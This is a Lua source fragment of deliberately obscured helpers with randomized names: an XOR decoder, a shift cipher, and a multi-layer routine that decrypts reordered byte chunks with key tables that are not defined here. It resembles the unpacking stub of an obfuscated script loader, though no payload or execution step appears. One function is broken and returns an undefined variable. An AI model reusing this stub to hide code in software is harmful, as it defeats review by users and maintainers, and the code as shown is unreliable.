local function _RusjGrHWednrBv(d, k)
    local r = {}
    for i = 1, #d do
        r[i] = string.char(bit32.bxor(d[i], k[(i % #k) + 1]))
    end
    return table.concat(r)
end

local function _GaZbVcrZhwTYHG(s, n)
    local o = {}
    for i = 1, #s do
        o[i] = string.char((string.byte(s, i) + n) % 256)
    end
    return table.concat(o)
end

local function _raIqTUgTyTkYBr(t)

    return s
end

local function _AjTHgoHOyCwgjq()
    local pos = 0
    local result = {}
    local kl = #_zpSPXHoWJNSxsZ

    local ordered = {}
    for i = 1, #_osOEMQlBTwXOlp do
        ordered[i] = _AedVLCtlXzJmdx[_osOEMQlBTwXOlp[i]]
    end

    for ci = 1, #ordered do
        local chunk = ordered[ci]
        for bi = 1, #chunk do
            local b = chunk[bi]
            local ki = (pos % kl) + 1

            b = bit32.bxor(b, _bJeotJfDSJmsJK[ki], bit32.band(pos, 255))

            b = bit32.bxor(b, _tSqQgPncEIQQfM[ki])
            b = bit32.bor(bit32.rshift(b, 3), bit32.band(bit32.lshift(b, 5), 255))
            b = bit32.band(b, 255)

            b = bit32.bxor(b, _zpSPXHoWJNSxsZ[ki])

            result[#result + 1] = string.char(b)
            pos = pos + 1
        end
    end

    return table.concat(result)
end
